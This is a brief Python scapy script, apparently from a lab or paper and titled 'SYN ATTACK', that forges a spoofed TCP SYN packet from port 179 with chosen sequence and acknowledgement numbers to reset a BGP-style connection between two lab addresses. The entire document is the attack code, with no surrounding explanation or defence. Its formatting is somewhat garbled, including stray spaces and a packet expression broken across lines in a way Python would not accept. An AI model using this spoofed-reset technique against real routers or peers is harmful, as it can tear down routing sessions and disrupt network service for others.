#! /usr/bin/env python
# TEST 2: SYN ATTACK
# Causes a RESET of connection
# python ./ test2 .py ( dstPort ) ( seqNum ) ( ackNum )
from scapy .all import *

srcIP = "100.2.3.2"
srcPort = 179

dstIP = "100.2.3.1"
dstPort = int(sys.argv [1])

seqNum = int(sys.argv [2])
ackNum = int(sys.argv [3])

a = IP(dst = dstIP, src = srcIP, ttl = 1)/
	TCP(dport = dstPort, sport = srcPort, flags = "S", seq = seqNum, ack = ackNum)

send(a)
